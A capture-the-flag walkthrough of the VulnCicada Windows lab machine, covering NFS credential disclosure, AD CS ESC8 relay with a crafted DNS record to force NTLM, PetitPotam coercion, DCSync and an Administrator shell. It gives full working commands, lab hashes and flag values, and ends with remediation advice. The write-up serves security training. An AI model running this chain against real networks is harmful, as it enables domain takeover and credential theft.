|Property|Value|
|---|---|
|**OS**|Windows|
|**Difficulty**|Medium|
|**Release Date**|2025-07-03|
|**State**|Active|
|**IP**|10.129.234.48|
|**Techniques**|NFS enumeration, credential disclosure, ADCS ESC8, NTLM-forced coercion, DCSync|
|**Tags**|#ad #windows #privesc #adcs #nfs|

> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.234.48`, `10.129.150.101`).

---

## Summary

VulnCicada is a medium Windows machine built around Active Directory. An NFS export exposes a writable `profiles` share used to store employee profile pictures; one of these pictures, uploaded by `Rosie.Powell`, is a desk photo that has her password written on a visible sticky note. With her credentials, SMB and the `CertEnroll` share reveal that AD CS (Active Directory Certificate Services) is running, and `certipy-ad` confirms it is vulnerable to **ESC8** (HTTP Web Enrollment with no protection against NTLM relay). Because the domain enforces Kerberos and refuses plain NTLM, a specially crafted DNS record is registered first to force the Domain Controller into using NTLM instead of Kerberos when it's coerced. A PetitPotam-style coercion is then triggered and relayed straight to the ADCS web enrollment endpoint, resulting in a certificate for the DC's own machine account. That certificate is used to authenticate and recover the DC's NT hash, which is used to DCSync the domain and grab the `Administrator` hash, completing the compromise.

---

## Enumeration

### Nmap Scan

```
nmap -sC -sV vulncicada.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 09:55 EDT
Nmap scan report for vulncicada.htb (10.129.234.48)
Host is up (0.029s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

The usual AD services set (DNS, Kerberos, LDAP, SMB, RPC, RDP, WinRM) is present, along with the domain `cicada.vl` and hostname `DC-JPQ225`. Two ports stand out from a standard DC: **111** and **2049**, RPC/NFS. Windows Domain Controllers don't normally run NFS, so this looks like a deliberately added service worth checking first.

```
sudo nmap --script nfs* -sV -p111,2049 vulncicada.htb
PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind?
| nfs-statfs:
|   Filesystem  1K-blocks   Used        Available  Use%
|_  /profiles   16105468.0  12721588.0  3383880.0  79%
| nfs-ls: Volume /profiles
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  FILENAME
| rwxrwxrwx   Administrator
| rwxrwxrwx   Daniel.Marshall
| rwxrwxrwx   Debra.Wright
| rwxrwxrwx   Jane.Carter
| rwxrwxrwx   Jordan.Francis
| rwxrwxrwx   Joyce.Andrews
| rwxrwxrwx   Katie.Ward
| rwxrwxrwx   Megan.Simpson
2049/tcp open  mountd   1-3 (RPC #100005)
```

An NFS export called `/profiles` is world-readable **and** world-writable (`rwxrwxrwx`) with one folder per domain user.

### NFS Enumeration

Mounting the share locally:

```
sudo mount -t nfs vulncicada.htb:/ ./NFS/ -o nolock
```

Listing the mounted `profiles` folder shows a picture in a couple of the user directories:

```
┌──(kali㉿kali)-[~/machines/vulncicada/NFS/profiles]
└─$ ls *
Administrator:
Documents  vacation.png

Rosie.Powell:
Documents  marketing.png
```

The files are owned by a "nobody" UID (`4294967294`), which is how NFS represents a remote root/unmapped user — a normal symptom of `no_root_squash`/anonymous mapping on the export. Since the export is world-writable, the file's local permission bits don't actually stop us from reading it:

```
cd Rosie.Powell
sudo chmod 777 marketing.png
```

Opening `marketing.png` shows a photo of an employee's desk with a password written on a sticky note stuck to the desk in plain sight:

![](./screens/marketing.png)

Credentials recovered: **`Rosie.Powell:Cicada123`**

---

## Foothold & SMB / AD CS Enumeration

### SMB Enumeration

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 Share           Permissions     Remark
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 ADMIN$
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 C$
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 CertEnroll      READ            Active Directory Certificate Services share
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 IPC$            READ
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 NETLOGON        READ
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 profiles$       READ,WRITE
SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 SYSVOL          READ
```

Two things stand out here:

1. `(NTLM:False)` — this domain has NTLM authentication disabled and enforces Kerberos. This matters later.
2. A `CertEnroll` share is present, meaning **AD CS (Active Directory Certificate Services)** is installed on the DC.

Since NTLM is disabled, plain password-based `smbclient` fails and Kerberos has to be used instead. `/etc/krb5.conf` is then configured:

```
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    CICADA.VL = {
        kdc = DC-JPQ225.cicada.vl
        admin_server = DC-JPQ225.cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
```

```
kinit Rosie.Powell@CICADA.VL   # password: Cicada123
klist                          # confirm a TGT was issued
```

With a valid Kerberos ticket, the `CertEnroll` share is browsable and confirms an active AD CS deployment (a large number of issued certificates and CRLs), verifying AD CS is live and worth targeting.

### Enumerating AD CS with certipy

```
export KRB5CCNAME=/tmp/krb5cc_1000

certipy-ad find -u Rosie.Powell@cicada.vl -k -dc-ip 10.129.150.101 -dc-host DC-JPQ225.cicada.vl -vulnerable
```

```
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    Permissions
      Access Rights
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
```

`certipy` flags **ESC8**: the CA's Web Enrollment page (`/certsrv`) is exposed over plain HTTP, with no protection (no Extended Protection for Authentication, no HTTPS-only, no channel binding) against relayed authentication. Any coerced or intercepted authentication that reaches this page can be traded for a valid certificate.

---

## Privilege Escalation — ADCS ESC8

### The problem: Kerberos is enforced

Normally, ESC8 is abused by coercing a machine (e.g. the DC itself) into authenticating to an attacker-controlled listener, and relaying that **NTLM** authentication to the CA's web enrollment page to request a certificate on the victim's behalf.

The catch here is that this domain enforces Kerberos and rejects NTLM (`NTLM:False`, seen earlier). When Windows is coerced into authenticating to a hostname, it decides whether to use Kerberos or NTLM based on whether it can resolve that hostname to a valid Service Principal Name (SPN). If a real SPN can be built, it will use Kerberos, and Kerberos can't be relayed the same simple way NTLM can.

### The trick: forcing an NTLM downgrade via a crafted DNS record

Windows builds the SPN for an outgoing authentication from the resolved DNS name, using an API called `CredMarshalTargetInfo`. That API also allows Base64-encoded "target info" to be appended to the DNS/SPN name it receives. If a **DNS record is registered whose name is the target hostname with an empty/garbage `CREDENTIAL_TARGET_INFORMATION` blob appended to it**, Windows fails to unmarshal a usable SPN from that name and silently falls back to NTLM instead of Kerberos for that one authentication attempt. This is a known DNS-poisoning technique for forcing NTLM relay even in Kerberos-enforced environments (see references).

The minimal blob needed is `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`, so the record to add is:

```
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Registering it, pointed at the attacker's IP, with `bloodyAD` (any authenticated user can create DNS records in AD by default):

```
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl \
  add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.80
```

```
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

### Relaying to the CA

An NTLM relay listener is started, targeting the ADCS web enrollment page and requesting a `DomainController` certificate template (issuable to any machine account):

```
impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' \
  --adcs --template DomainController
```

The DC is then coerced (via PetitPotam / `EfsRpcAddUsersToFile`) into authenticating back to the crafted DNS record — which, thanks to the trick above, makes it use NTLM instead of Kerberos:

```
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k \
  -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```
COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

The relay catches it and successfully retrieves a certificate for the DC's own machine account:

```
[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
[*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
[*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
```

### From certificate to Domain Admin

The PFX certificate is used to authenticate as the DC's machine account (`dc-jpq225$`) and pull its NT hash:

```
certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.150.101
```

```
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

Domain Controllers hold replication rights by default, so this machine account can perform a **DCSync** and pull any account's hash straight from the domain, including `Administrator`:

```
export KRB5CCNAME=dc-jpq225.ccache

impacket-secretsdump -k -no-pass -dc-ip 10.129.150.101 \
  cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

A Kerberos ticket is forged for `Administrator` using the recovered hash:

```
impacket-getTGT -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.150.101 cicada.vl/'Administrator'
```

And used to get a shell on the DC:

```
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.129.150.101 cicada.vl/Administrator@DC-JPQ225.cicada.vl
```

```
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
cicada\administrator
```

---

## Flags

Both flags sit on the `Administrator` desktop, since the ESC8 chain leads straight to Domain Admin with no separate low-privilege shell needed:

```
C:\Users\Administrator\Desktop>type user.txt
6877173beaeffe805a33b07f91b05eaf

C:\Users\Administrator\Desktop>type root.txt
31a880eaf25d8971361cfb428202ed01
```

---

## Remediation

- **World-writable NFS export:** Never export a share with `rwxrwxrwx`/anonymous-write permissions, especially one storing content tied to real user accounts. Restrict NFS exports to specific trusted hosts and enforce `root_squash`.
- **Sensitive data in images:** Passwords or other secrets should never be written down where they can be photographed, and uploaded images should not be trusted as harmless binary blobs — treat any user-supplied file as something worth a quick look.
- **AD CS Web Enrollment over HTTP (ESC8):** Disable HTTP Web Enrollment, or if it must stay enabled, require HTTPS with Extended Protection for Authentication (EPA/channel binding) so relayed authentication cannot be used to request certificates.
- **NTLM authentication downgrade via DNS:** Even with NTLM disabled at the domain level, ADIDNS records can still be abused to force a fallback to NTLM for a single coerced authentication. Restrict who can create DNS records (`Authenticated Users` should not have this by default), and monitor for newly created records with abnormal/encoded names.
- **Coercion primitives (PetitPotam/EfsRpcAddUsersToFile):** Patch and harden against known coercion RPC calls, and require SMB signing everywhere to reduce the value of any coerced authentication that does get relayed.
- **DCSync exposure:** Any compromised machine account with replication rights (every DC, by design) is one relay away from a full domain compromise when ESC8 is present. Treat AD CS misconfigurations as Domain-Admin-equivalent findings.

---

## References

- ESC8 overview — [Sentry Security: ESC8 Attack Guide for Windows Environments](https://blog.sentry.security/esc8-attack-guide-for-windows-environments-2/)
- ADCS + PetitPotam NTLM relay chain — [ired.team: ADCS + PetitPotam NTLM Relay](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)
- Forcing NTLM via a crafted ADIDNS record (`CREDENTIAL_TARGET_INFORMATION` trick) — [TheHackerRecipes: Kerberos Relay](https://www.thehacker.recipes/ad/movement/kerberos/relay) and [TheHackerRecipes: NTLM Relay — CVE-2025-33073](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- Underlying research on the SPN-marshalling trick — [Synacktiv: Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)
- CoerceAndRelayNTLMToADCS edge — [SpecterOps / BloodHound docs](https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs)